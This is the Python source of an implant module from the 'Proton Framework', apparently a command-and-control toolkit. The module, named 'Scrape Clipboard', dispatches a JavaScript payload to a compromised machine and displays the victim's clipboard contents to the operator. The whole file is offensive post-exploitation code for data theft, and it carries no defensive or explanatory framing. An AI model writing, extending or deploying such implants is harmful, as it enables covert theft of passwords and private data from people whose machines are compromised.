#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.job
import core.implant
import uuid

class ClipboardJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain("Clipboard contents:")
        self.shell.print_plain(self.data)
        self.results = self.data

class ClipboardImplant(core.implant.Implant):

    NAME = "Scrape Clipboard"
    DESCRIPTION = "Gets the contents of the clipboard."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/gather/clipboard"

    def load(self):
        pass

    def job(self):
        return ClipboardJob

    def run(self):
        payloads = {}
        payloads["js"] = "data/implant/gather/clipboard.js"
        self.dispatch(payloads, self.job)
